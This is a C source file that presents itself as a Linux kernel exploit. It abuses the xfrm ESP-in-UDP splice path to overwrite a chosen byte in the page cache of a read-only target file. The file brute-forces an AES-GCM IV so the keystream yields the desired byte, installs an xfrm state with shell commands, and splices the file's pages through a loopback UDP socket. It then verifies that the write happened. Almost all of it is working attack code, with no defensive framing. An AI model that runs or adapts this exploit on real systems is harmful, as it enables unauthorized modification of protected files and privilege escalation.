// copyfail2.c - kernel page-cache write via xfrm ESP MSG_SPLICE_PAGES bug
// run inside: aa-rootns -n -- ./copyfail2 [target-file]
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#include <openssl/evp.h>

#define SPI            0xdeadbeef
#define ENC_PORT       4500
#define IVLEN          8
#define ICVLEN         16
#define AES_KEYLEN     16
#define SALT_LEN       4
#define KEYTOTAL       (AES_KEYLEN + SALT_LEN)   // 20 bytes for rfc4106

#ifndef SPLICE_F_MORE
#define SPLICE_F_MORE 0x4
#endif

static const unsigned char AEAD_KEY[KEYTOTAL] = {
    0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
    0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,
    0x10,0x11,0x12,0x13                                  // last 4 = salt
};

static void die(const char *m) { perror(m); exit(1); }

// AES-CTR keystream byte at offset 'off' (in bytes from start of ciphertext)
// rfc4106 counter starts at 1; OpenSSL EVP_aes_128_gcm with 12B nonce handles that.
static int aes_gcm_keystream_byte(const unsigned char *key16,
                                  const unsigned char *nonce12,
                                  size_t off, unsigned char *out)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    int len;
    if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL)) goto bad;
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL)) goto bad;
    if (!EVP_EncryptInit_ex(ctx, NULL, NULL, key16, nonce12)) goto bad;
    unsigned char zeros[256] = {0};
    size_t need = off + 1;
    unsigned char buf[256];
    while (need) {
        size_t chunk = need < sizeof(zeros) ? need : sizeof(zeros);
        if (!EVP_EncryptUpdate(ctx, buf, &len, zeros, chunk)) goto bad;
        if (chunk == need) {
            *out = buf[chunk - 1];
            EVP_CIPHER_CTX_free(ctx);
            return 0;
        }
        need -= chunk;
    }
bad:
    EVP_CIPHER_CTX_free(ctx);
    return -1;
}

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr, "usage: %s <target-file> <byte-offset> <want-plain-byte>\n", argv[0]);
        return 2;
    }
    const char *target  = argv[1];
    size_t      tboff   = strtoul(argv[2], 0, 0);     // byte offset in file
    unsigned char want_plain = (unsigned char)strtoul(argv[3], 0, 0);

    // 1. read original byte
    int tfd = open(target, O_RDONLY);
    if (tfd < 0) die("open target");
    unsigned char tbyte;
    if (pread(tfd, &tbyte, 1, tboff) != 1) die("pread target byte");
    unsigned char want_ks = tbyte ^ want_plain;
    printf("[+] target=%s   off=%zu   ciphertext=0x%02x   want_plain=0x%02x   need_ks=0x%02x\n",
           target, tboff, tbyte, want_plain, want_ks);
    if (tbyte == want_plain) { printf("[!] target byte already equals desired value\n"); return 0; }

    // 2. brute-force IV: keystream byte 0 (since ciphertext is 1 byte at counter-1 offset 0)
    unsigned char IV[IVLEN] = {0};
    unsigned char nonce[12];
    memcpy(nonce, AEAD_KEY + AES_KEYLEN, SALT_LEN);
    unsigned char ks_byte = 0;
    uint64_t ivv;
    for (ivv = 1; ivv < (1ULL<<32); ivv++) {
        memcpy(IV, &ivv, IVLEN);
        memcpy(nonce + SALT_LEN, IV, IVLEN);
        if (aes_gcm_keystream_byte(AEAD_KEY, nonce, 0, &ks_byte)) {
            fprintf(stderr, "openssl error\n"); return 1;
        }
        if (ks_byte == want_ks) break;
    }
    if (ks_byte != want_ks) { fprintf(stderr, "no IV found\n"); return 1; }
    printf("[+] IV found (after %lu trials): ", (unsigned long)ivv);
    for (int i=0;i<IVLEN;i++) printf("%02x", IV[i]);
    printf("   keystream[0]=0x%02x → plain=0x%02x\n", ks_byte, tbyte ^ ks_byte);

    // 3. install xfrm state via shell (we are inside aa-rootns -n)
    char keyhex[KEYTOTAL*2 + 3] = "0x";
    for (int i=0;i<KEYTOTAL;i++) sprintf(keyhex + 2 + i*2, "%02x", AEAD_KEY[i]);
    char cmd[1024];
    snprintf(cmd, sizeof cmd,
        "ip link set lo up ; "
        "ip xfrm state flush ; "
        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi 0x%08x "
        "encap espinudp %d %d 0.0.0.0 aead 'rfc4106(gcm(aes))' %s 128 "
        "replay-window 32",
        SPI, ENC_PORT, ENC_PORT, keyhex);
    if (system(cmd) != 0) { fprintf(stderr, "xfrm install failed\n"); return 1; }

    // 4. open recv UDP socket bound to :4500 with UDP_ENCAP=ESPINUDP
    int rs = socket(AF_INET, SOCK_DGRAM, 0);
    if (rs < 0) die("recv sock");
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(rs, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0)
        die("UDP_ENCAP setsockopt");
    struct sockaddr_in la = {.sin_family = AF_INET,
                              .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
                              .sin_port = htons(ENC_PORT)};
    if (bind(rs, (struct sockaddr*)&la, sizeof la) < 0) die("bind recv");

    // 5. craft attacker pages (ESP header + ICV) in a backing file
    char atkpath[64];
    snprintf(atkpath, sizeof atkpath, "/tmp/cf2.atk.%d", (int)getpid());
    unlink(atkpath);
    int afd = open(atkpath, O_RDWR | O_CREAT | O_EXCL, 0600);
    if (afd < 0) die("open atk");
    unsigned char esp_hdr[16];
    *(uint32_t*)(esp_hdr + 0) = htonl(SPI);
    *(uint32_t*)(esp_hdr + 4) = htonl(1);     // SeqNum
    memcpy(esp_hdr + 8, IV, IVLEN);
    if (pwrite(afd, esp_hdr, 16, 0) != 16) die("pwrite esp_hdr");
    unsigned char icv[16] = {0};
    if (pwrite(afd, icv, 16, 4096) != 16) die("pwrite icv");
    fsync(afd);
    posix_fadvise(afd, 0, 0, POSIX_FADV_DONTNEED);
    int afd2 = open(atkpath, O_RDONLY);
    if (afd2 < 0) die("reopen atk");
    unlink(atkpath);

    // 6. splice three ranges into pipe
    int pfd[2];
    if (pipe(pfd) < 0) die("pipe");
    fcntl(pfd[0], F_SETPIPE_SZ, 1<<20);
    fcntl(pfd[1], F_SETPIPE_SZ, 1<<20);

    loff_t off = 0;
    if (splice(afd2, &off, pfd[1], NULL, 16, SPLICE_F_MORE) != 16) die("splice esp_hdr");
    loff_t toff = tboff;
    if (splice(tfd,  &toff, pfd[1], NULL, 1, SPLICE_F_MORE) != 1) die("splice target byte");
    loff_t ioff = 4096;
    if (splice(afd2, &ioff, pfd[1], NULL, 16, SPLICE_F_MORE) != 16) die("splice icv");

    // 7. splice pipe → UDP socket (kernel sets MSG_SPLICE_PAGES)
    int ss = socket(AF_INET, SOCK_DGRAM, 0);
    if (ss < 0) die("send sock");
    struct sockaddr_in da = la;
    if (connect(ss, (struct sockaddr*)&da, sizeof da) < 0) die("connect");
    ssize_t sent = splice(pfd[0], NULL, ss, NULL, 16+1+16, 0);
    printf("[+] splice→UDP sent=%zd errno=%d\n", sent, errno);

    usleep(200*1000);
    unsigned char vbyte;
    if (pread(tfd, &vbyte, 1, tboff) != 1) die("verify pread");
    printf("[+] post byte at offset %zu = 0x%02x  (was 0x%02x, wanted 0x%02x)  match=%s\n",
           tboff, vbyte, tbyte, want_plain, vbyte == want_plain ? "YES" : "NO");
    return vbyte == want_plain ? 0 : 1;
}
